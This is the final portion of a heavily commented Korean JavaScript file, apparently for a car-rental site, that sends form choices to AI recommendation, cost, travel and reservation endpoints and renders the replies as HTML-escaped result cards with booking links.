    var iconMap  = { recommend: '🚗', cost: '💰', travel: '✈' };   // 서비스 종류별 아이콘을 미리 정해 둔다 (HTML 요소 아님, 그냥 자바스크립트 객체)
    var labelMap = { recommend: 'AI 추천 결과', cost: 'AI 비용 분석', travel: 'AI 여행 계획' };   // 서비스 종류별 제목을 미리 정해 둔다

    result.innerHTML =   // 위에서 찾은 result 상자(div) 안쪽 내용을, 아래에서 조립한 HTML 문자열로 통째로 새로 채워 넣는다
        '<div class="ai-result-card">' +                          // 결과 카드 전체를 감싸는 상자를 연다 (이 div들은 지금 새로 "만들어지는" 요소다, 화면엔 아직 없음)
            '<div class="ai-result-header">' +                    // 카드 맨 위, 아이콘+제목이 들어갈 줄을 연다
                '<span class="ai-result-icon" aria-hidden="true">' + (iconMap[type] || '🤖') + '</span>' +   // 서비스 종류에 맞는 아이콘을 넣는다. 없으면 기본 로봇 아이콘을 쓴다
                '<span class="ai-result-label">' + (labelMap[type] || 'AI 응답') + '</span>' +               // 서비스 종류에 맞는 제목을 넣는다. 없으면 기본 제목을 쓴다
            '</div>' +                                              // 헤더 줄을 닫는다
            '<div class="ai-result-body">' + formatAIResponse(text) + '</div>' +   // AI가 답한 내용을 안전하게 서식 처리해서 넣는다 (escapeHtml 을 거친 값)
            '<button type="button" class="btn btn-outline btn-sm mt-4" ' +         // "다시 물어보기" 버튼을 새로 만든다
                    'onclick="resetResult(' + resultNum + ')">🔄 다시 물어보기</button>' +   // 이 버튼을 누르면 resetResult 함수가 같은 번호의 result 상자를 지운다
        '</div>';                                                    // 카드 전체 상자를 닫는다

    result.style.display = 'block';   // result 상자(div)의 display 를 block 으로 바꿔 방금 채운 내용이 화면에 보이게 한다
    result.scrollIntoView({ behavior: 'smooth', block: 'start' });   // 브라우저가 result 상자가 있는 위치까지 부드럽게 스크롤을 옮겨 준다
}

/* ------------------------------------------------------------
   결과 초기화
   ------------------------------------------------------------ */
function resetResult(resultNum) {
    var result = document.getElementById('result-' + resultNum);   // id="result-1/2/3/4" 중 해당 번호의 결과 상자(div)를 찾는다
    result.style.display = 'none';   // 그 상자의 display 를 none 으로 바꿔 화면에서 숨긴다
    result.innerHTML = '';   // 그 상자 안의 내용도 완전히 비운다 (다음에 열 때 이전 결과가 잠깐이라도 보이지 않게)
}

/* ------------------------------------------------------------
   AI 응답 서식 처리

   [보안] 순서가 중요하다.
     (1) escapeHtml 로 전부 무해하게 바꾼다  -> <script> 도 &lt;script&gt; 가 된다
     (2) 그 다음 **굵게** 와 줄바꿈만 되살린다 -> 되살리는 대상이 <b>, <br> 뿐이라 안전하다
   반대로 하면(서식 먼저, 이스케이프 나중) 아무 의미가 없다.
   ------------------------------------------------------------ */
function formatAIResponse(text) {
    var safe = escapeHtml(text);   // 먼저 전부 무해한 글자로 바꾼다. 이 순서를 지켜야 안전하다
    safe = safe.replace(/\*\*(.+?)\*\*/g, '<b>$1</b>');   // **굵게**
    safe = safe.replace(/\r\n|\r|\n/g, '<br>');           // 줄바꿈
    return safe;   // 서식만 되살린 안전한 HTML 을 돌려준다
}

/* ============================================================
   탭1 : AI 맞춤 차량 추천
   ============================================================ */
function sendAIRecommend() {

    var passengers = document.getElementById('rec-passengers').value;   // id="rec-passengers" 인 <select>(탑승 인원 드롭다운)를 찾아, 지금 선택된 값(예: "4")을 읽는다
    var budget     = document.getElementById('rec-budget').value;   // id="rec-budget" 인 <select>(1일 예산 드롭다운)에서 선택된 값을 읽는다
    var purpose    = document.getElementById('rec-purpose').value;   // id="rec-purpose" 인 <select>(이용 목적 드롭다운)에서 선택된 값을 읽는다

    var message = '탑승인원: ' + passengers + '명, '   // 위 세 값을 하나의 자연어 문장으로 조립한다. AI 는 문장으로 받아야 잘 이해한다
                + '1일 예산: ' + budget + ', '
                + '용도: ' + purpose + '. '
                + '이 조건에 맞는 최적의 렌트카를 추천해주세요.';

    callAIService(message, 'recommend', 1);   // 조립한 문장으로 AI 를 부른다. resultNum=1 이므로 btn-1/loading-1/result-1 요소들이 다뤄진다
}

/* ============================================================
   탭2 : AI 비용 계산기
   ============================================================ */
function sendAICost() {

    var carSelect = document.getElementById('cost-car');   // id="cost-car" 인 <select>(차량 선택 드롭다운)를 찾는다. 차량이 없으면 이 select 자체가 화면에 없을 수 있다

    /* 차량 목록이 비어 select 자체가 없을 수 있다 (DB에 차량이 없을 때) */
    if (!carSelect || !carSelect.value) {   // carSelect 요소 자체가 없거나(null), 있어도 선택된 값이 비어 있으면
        alert('선택할 수 있는 차량이 없습니다.');   // 브라우저 기본 경고창을 띄운다 (특정 HTML 요소가 아니라 브라우저가 직접 보여주는 창)
        return;   // 고를 차가 없으면 여기서 함수를 끝낸다
    }

    var carParts = carSelect.value.split('|');   // cost-car select 에서 선택된 값("차량명|가격")을 | 기준으로 잘라 배열로 만든다
    var carName  = carParts[0];   // 잘린 배열의 0번째, 즉 차량명
    var carPrice = Number(carParts[1] || 0);   // 잘린 배열의 1번째, 즉 가격. 숫자로 바꾸고 실패하면 0 을 쓴다
    var days     = document.getElementById('cost-days').value;   // id="cost-days" 인 <select>(대여 기간 드롭다운)에서 선택된 일수를 읽는다

    /*
     선택한 옵션을 모은다.
     [변경] 금액을 JS 안에 적어두지 않고 data-price 속성에서 읽는다.
            그 값은 서버(CarService.PRICE_*)가 내려준 것이다.
    */
    var optionIds = [   // 화면에 있는 옵션 체크박스 4개(<input type="checkbox">)의 id와 이름을 배열(목록)로 미리 정리해 둔다
        { id: 'cost-ins',  name: '자차보험' },     // id="cost-ins" 인 체크박스 = 자차보험
        { id: 'cost-wifi', name: '무선 WiFi' },    // id="cost-wifi" 인 체크박스 = 무선 WiFi
        { id: 'cost-navi', name: '네비게이션' },   // id="cost-navi" 인 체크박스 = 네비게이션
        { id: 'cost-baby', name: '베이비시트' }    // id="cost-baby" 인 체크박스 = 베이비시트
    ];   // 배열을 닫는다. 이렇게 목록으로 만들어 두면 아래 for문에서 하나씩 반복 처리할 수 있다

    var options = [];   // 고른 옵션 이름을 모을 빈 목록
    for (var i = 0; i < optionIds.length; i++) {   // 옵션 4개를 하나씩 확인한다
        var box = document.getElementById(optionIds[i].id);   // 이번 순서의 id(cost-ins 등)를 가진 실제 <input type="checkbox"> 요소를 찾는다
        if (box && box.checked) {   // 그 체크박스가 실제로 존재하고, 사용자가 체크(선택)해 두었다면
            var price = Number(box.getAttribute('data-price') || 0);   // 그 체크박스 태그에 심어 둔 data-price 속성값(요금)을 읽는다. 이 값은 서버가 내려준 것이다
            options.push(optionIds[i].name + '(' + price.toLocaleString() + '원/일)');   // "자차보험(15,000원/일)" 형태로 목록에 담는다.  toLocaleString 은 천 단위 쉼표를 넣어 준다
        }
    }

    var message = '차량: ' + carName + ' (일일 렌탈료 ' + carPrice.toLocaleString() + '원), '   // 지금까지 읽은 값들을 하나의 자연어 문장으로 조립한다
                + '대여기간: ' + days + '일, '
                + '추가옵션: ' + (options.length > 0 ? options.join(', ') : '없음') + '. '
                + '총 비용을 계산하고 절약 팁을 알려주세요.';

    callAIService(message, 'cost', 2);   // 조립한 문장으로 AI 를 부른다. resultNum=2 이므로 btn-2/loading-2/result-2 요소들이 다뤄진다
}

/* ============================================================
   탭3 : AI 여행 플래너
   ============================================================ */
function sendAITravel() {

    var destInput = document.getElementById('travel-dest');   // id="travel-dest" 인 <input type="text">(여행지 입력칸) 요소 자체를 찾아 둔다 (아직 값이 아니라 요소)
    var hint      = document.getElementById('travel-dest-hint');   // id="travel-dest-hint" 인 <p>(입력칸 바로 아래 안내 문구 자리)를 찾는다
    var dest      = destInput.value.trim();   // destInput 요소의 현재 입력값(value)을 읽고, trim() 으로 앞뒤 공백을 없앤다

    /* [변경] alert 대신 입력칸 아래에 안내를 띄운다.
             alert 은 화면을 가려서 어느 칸이 문제인지 알기 어렵다. */
    if (!dest) {   // 입력값이 빈 문자열이면(아무것도 안 썼으면)
        hint.textContent = '여행지를 입력해주세요.';   // hint(<p>) 안의 글자를 이 안내 문구로 바꾼다
        hint.className = 'form-error';   // hint(<p>)의 class 를 form-error 로 바꿔 CSS가 빨간 글씨로 보여주게 한다
        destInput.focus();   // destInput(입력칸)에 커서를 놓아 준다 (어디를 고칠지 바로 알 수 있게)
        return;   // 여기서 함수를 끝낸다
    }

    hint.textContent = '';   // 입력이 정상이면 hint(<p>) 안의 안내 문구를 빈 문자열로 지운다
    hint.className = 'form-hint';   // hint(<p>)의 class 도 평소 상태(form-hint)로 되돌린다

    var days   = document.getElementById('travel-days').value;   // id="travel-days" 인 <select>(여행 일수 드롭다운)에서 선택된 값을 읽는다
    var people = document.getElementById('travel-people').value;   // id="travel-people" 인 <select>(여행 인원 드롭다운)에서 선택된 값을 읽는다
    var style  = document.getElementById('travel-style').value;   // id="travel-style" 인 <select>(여행 스타일 드롭다운)에서 선택된 값을 읽는다

    var message = '여행지: ' + dest + ', '   // 지금까지 읽은 값들을 하나의 자연어 문장으로 조립한다
                + '기간: ' + days + '일, '
                + '인원: ' + people + '명, '
                + '여행스타일: ' + style + '. '
                + '일정별 여행 계획과 추천 렌트카를 알려주세요.';

    callAIService(message, 'travel', 3);   // 조립한 문장으로 AI 를 부른다. resultNum=3 이므로 btn-3/loading-3/result-3 요소들이 다뤄진다
}

/* ============================================================
   탭4 : 말로 예약 (자연어 예약 비서)

   탭 1~3 의 callAIService 를 쓰지 않고 따로 만든 이유:
     저쪽 응답은 "글"이고, 이쪽 응답은 "데이터(차량 목록)"다.
     서버가 내려준 차량 배열을 카드로 그리고,
     예약 버튼에 조건(시작일/일수/대수)을 실어 기존 예약 흐름으로 보낸다.
   ============================================================ */

/* 예시 문장 버튼 : 누르면 입력칸에 채워진다 */
(function () {   // 페이지가 로드되자마자 바로 실행되는 함수(IIFE). 아래 괄호 () 가 즉시 실행시킨다
    var examples = document.querySelectorAll('.reserve-example');   // class="reserve-example" 가 붙은 <button> 3개(예시 문장 버튼들)를 모두 찾는다
    for (var i = 0; i < examples.length; i++) {   // 찾은 예시 버튼들을 하나씩 처리한다
        examples[i].addEventListener('click', function () {   // i번째 예시 버튼에 "클릭되면 실행할 동작"을 등록해 둔다 (지금 실행되는 게 아니라 나중에 클릭될 때 실행됨)
            document.getElementById('reserve-text').value = this.textContent.trim();   // id="reserve-text" 인 <textarea>(예약 문장 입력칸)의 값을, 방금 누른 버튼(this)의 글자로 채운다
            document.getElementById('reserve-text').focus();   // 같은 textarea(reserve-text)에 커서를 놓아 준다 (바로 고쳐 쓸 수 있게)
        });
    }
})();   // 이 괄호가 위에서 정의한 함수를 "바로 실행" 시킨다

function sendAIReserve() {   // "말로 예약하기" 버튼(id="btn-4")이 부르는 함수

    var input = document.getElementById('reserve-text');   // id="reserve-text" 인 <textarea>(예약 문장 입력칸) 요소를 찾는다
    var hint  = document.getElementById('reserve-hint');   // id="reserve-hint" 인 <p>(입력칸 아래 안내 문구 자리)를 찾는다
    var text  = input.value.trim();   // input(textarea) 요소의 현재 값을 읽고 앞뒤 공백을 없앤다

    if (!text) {   // 아무것도 입력하지 않았으면
        hint.textContent = '원하시는 일정을 입력해주세요.';   // hint(<p>) 안의 글자를 이 안내 문구로 바꾼다
        hint.className = 'form-error';   // hint(<p>)의 class 를 form-error 로 바꿔 빨간 글씨로 만든다
        input.focus();   // input(textarea)에 커서를 놓아 준다
        return;   // 여기서 함수를 끝낸다
    }
    hint.textContent = '';   // 입력이 정상이면 hint(<p>) 안의 안내 문구를 지운다
    hint.className = 'form-hint';   // hint(<p>)의 class 도 평소 상태로 되돌린다

    var btn     = document.getElementById('btn-4');   // id="btn-4" 인 <button>(조건에 맞는 차량 찾기 버튼)를 찾는다
    var loading = document.getElementById('loading-4');   // id="loading-4" 인 <div class="ai-loading">(불러오는 중 표시)를 찾는다
    var result  = document.getElementById('result-4');   // id="result-4" 인 <div class="ai-result">(결과가 그려질 빈 상자)를 찾는다

    btn.disabled = true;   // btn(버튼)을 잠근다 (연달아 눌러 중복 호출되는 것을 막는다)
    loading.style.display = 'block';   // loading(div)의 display 를 block 으로 바꿔 "불러오는 중" 표시를 보이게 한다
    result.style.display = 'none';   // result(div)의 display 를 none 으로 바꿔 이전 결과는 숨긴다

    var formData = new URLSearchParams();   // 서버로 보낼 값들을 담을 상자를 만든다 (HTML 요소 아님)
    formData.append('message', text);   // 이 상자에 message 라는 이름으로, input(textarea)에서 읽은 예약 문장을 담는다


    fetch(aiContextPath + '/Chatbot/reserveAI.do', {   // "말로 예약하기" 주소로 요청을 보낸다
        method: 'POST',   // POST 방식으로 보낸다
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',   // 본문이 "이름=값&이름=값" 형식이라고 알린다
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: formData.toString(),
        credentials: 'same-origin'
    })
    .then(function (response) {
        if (response.status === 403) {   // 403 = 보안 토큰이 맞지 않는다
            throw new Error('보안 토큰이 만료되었습니다. 화면을 새로 고친 뒤 다시 시도해주세요.');   // 무엇을 해야 하는지까지 알려 준다
        }
        if (!response.ok) {   // 그 밖에 200번대가 아닌 모든 경우
            throw new Error('서버 오류 (' + response.status + ')');   // 무슨 코드로 실패했는지 담아 실패로 처리한다
        }
        return response.json();   // 정상이면 응답을 JSON 으로 읽는다
    })
    .then(function (data) {   // 서버가 돌려준 데이터(data)를 화면 요소에 반영한다
        loading.style.display = 'none';   // loading(div)을 다시 안 보이게 한다
        btn.disabled = false;   // btn(버튼)의 잠금을 풀어 다시 누를 수 있게 한다
        renderReserveResult(data);   // result(div, id="result-4") 안에 추천 차량 카드를 그리는 함수를 부른다
    })
    .catch(function (error) {   // 통신이 실패한 경우
        loading.style.display = 'none';   // loading(div)을 다시 안 보이게 한다
        btn.disabled = false;   // btn(버튼)의 잠금을 풀어 다시 누를 수 있게 한다
        renderReserveResult({ reply: error.message || '네트워크 오류가 발생했습니다.' });   // 실패 이유를 같은 result 카드 모양으로 보여 준다 (화면이 갑자기 달라지지 않게)
        console.error('Reserve AI error:', error);   // 개발자가 원인을 볼 수 있게 브라우저 콘솔에 남긴다
    });
}

/* 서버 응답을 카드로 그린다 */
function renderReserveResult(data) {

    var result = document.getElementById('result-4');   // id="result-4" 인 <div class="ai-result">(탭4 결과가 그려질 빈 상자)를 찾는다

    /* [보안] 서버가 준 값도 이스케이프한다.
       차량명은 DB 값이고 reply 는 서버가 만든 문장이지만,
       "innerHTML 에 넣는 모든 문자열은 이스케이프한다"를 예외 없이 지킨다. */
    var html =   // 화면에 그릴 HTML 문자열을 여기서부터 계속 이어 붙여 나간다 (var 이므로 아래에서 html += 로 계속 추가된다)
        '<div class="ai-result-card">' +                          // 카드 전체를 감싸는 상자를 연다 (아직 안 닫음, 맨 뒤 862번째 줄쯤에서 닫는다)
            '<div class="ai-result-header">' +                    // 카드 맨 위, 아이콘+제목 줄을 연다
                '<span class="ai-result-icon" aria-hidden="true">🚗</span>' +   // 자동차 이모지를 아이콘으로 넣는다
                '<span class="ai-result-label">조건에 맞는 보유 차량</span>' +   // 이 카드의 제목을 넣는다 (고정 문구)
            '</div>' +                                              // 헤더 줄을 닫는다
            '<div class="ai-result-body">' + escapeHtml(data.reply || '').replace(/\n/g, '<br>') + '</div>';   // AI가 뽑아낸 조건 요약 문장을 이스케이프한 뒤 줄바꿈만 <br>로 되살려 넣는다. div는 아직 안 닫힌 카드 안에 들어간다

    var cars = data.cars || [];   // 추천 차량 목록을 꺼낸다. 없으면 빈 배열로 대신한다

    if (cars.length > 0) {   // 추천 차량이 하나라도 있으면
        html += '<div class="reserve-car-list">';   // 차량 카드들을 감쌀 상자를 연다

        for (var i = 0; i < cars.length; i++) {   // 차량을 하나씩 처리한다
            var car = cars[i];   // 이번에 그릴 차량 하나

            /* 숫자는 Number() 로 강제해 이상한 문자열이 못 끼어들게 한다 */
            var carno = Number(car.carno) || 0;
            var price = Number(car.carprice) || 0;   // 1일 요금. 숫자로 바꾸고 실패하면 0 을 쓴다
            var qty   = Number(car.qty) || 1;   // 필요 대수. 실패하면 1 을 쓴다
            var total = Number(car.total) || 0;   // 총액. 실패하면 0 을 쓴다
            var seats = Number(car.seats) || 0;   // 탑승 가능 인원. 실패하면 0 을 쓴다
            var days  = Number(data.days) || 1;   // 대여 일수. 실패하면 1 을 쓴다

            /* 예약 이어가기 : 기존 예약 흐름(CarInfo -> CarOption)으로
               시작일/일수/대수를 미리 채워 보낸다.
               begindate 는 서버가 만든 YYYY-MM-DD 값이지만 한 번 더 형식 검사한다. */
            var begin = /^\d{4}-\d{2}-\d{2}$/.test(data.begindate) ? data.begindate : '';   // 정규식으로 "숫자4개-숫자2개-숫자2개" 형태인지 검사한다. 형태가 맞으면 그 값을 쓰고, 아니면 빈 문자열을 쓴다 (조건 ? 참일때값 : 거짓일때값)
            var link = aiContextPath + '/Car/CarInfo.do?carno=' + carno   // "예약 이어가기" 링크를 만든다. 기존 예약 화면에 값이 미리 채워진 채로 열린다. ?carno= 뒤에 차량번호를 붙인다
                     + '&carqty=' + qty              // & 로 다음 값을 이어 붙인다 : 필요 대수
                     + '&carbegindate=' + begin      // 시작일을 이어 붙인다
                     + '&carreserveday=' + days;      // 대여 일수를 이어 붙여 링크 문자열을 완성한다

            html +=   // 지금까지 만든 html 뒤에 차량 카드 하나의 HTML 을 덧붙인다 (+= 는 "기존 값 뒤에 이어 붙인다"는 뜻)
                '<div class="reserve-car">' +                          // 차량 카드 한 장을 감싸는 상자를 연다
                    '<img class="reserve-car-img" loading="lazy" alt="' + escapeHtml(car.carname) + ' 사진"' +   // 차량 사진. alt 는 사진이 안 보일 때 대신 읽어줄 설명글이다
                        ' src="' + aiContextPath + '/img/' + encodeURIComponent(car.carimg || '') + '">' +   // 사진 경로. encodeURIComponent 로 파일명에 특수문자가 있어도 주소가 깨지지 않게 한다
                    '<div class="reserve-car-info">' +                 // 차량 정보(이름/좌석/가격)를 담을 상자를 연다
                        '<div class="reserve-car-name">' + escapeHtml(car.carname) + '</div>' +   // 차량 이름을 넣는다
                        '<div class="reserve-car-meta">' + seats + '인승 · ' +   // 탑승 인원을 넣는다
                            price.toLocaleString() + '원/일' +          // 1일 요금을 천 단위 쉼표를 넣어 표시한다
                            (qty > 1 ? ' · <b>' + qty + '대 필요</b>' : '') + '</div>' +   // 대수가 2대 이상이면 "N대 필요"를 굵게 덧붙이고, 1대면 아무것도 안 붙인다
                        '<div class="reserve-car-total">' + days + '일 총 ' + total.toLocaleString() + '원</div>' +   // 대여 일수와 총 금액을 넣는다
                    '</div>' +                                          // 차량 정보 상자를 닫는다
                    '<a class="btn btn-primary btn-sm" href="' + link + '">예약 이어가기 &rsaquo;</a>' +   // 위에서 만든 link 주소로 이동하는 버튼 모양 링크를 넣는다
                '</div>';                                                // 차량 카드 한 장의 상자를 닫는다
        }
        html += '</div>';   // 차량 카드들을 감싼 상자를 닫는다
    }

    html += '<button type="button" class="btn btn-outline btn-sm mt-4" ' +   // 새로 만들 "다른 일정으로 찾기" 버튼을 html 문자열 뒤에 붙인다
                'onclick="resetResult(4)">🔄 다른 일정으로 찾기</button>' +   // 이 버튼을 누르면 resetResult(4) 가 호출되어 result-4 상자를 지운다
        '</div>';   // 맨 처음(810번째 줄쯤)에 열어 둔 ai-result-card 상자를 이제야 닫는다

    result.innerHTML = html;   // 앞서 찾아 둔 result(div, id="result-4") 안에, 지금까지 조립한 html 문자열을 통째로 채워 넣는다
    result.style.display = 'block';   // result(div)의 display 를 block 으로 바꿔 화면에 보이게 한다
    result.scrollIntoView({ behavior: 'smooth', block: 'start' });   // 브라우저가 result(div)가 있는 위치까지 부드럽게 스크롤을 옮겨 준다
}
</script>
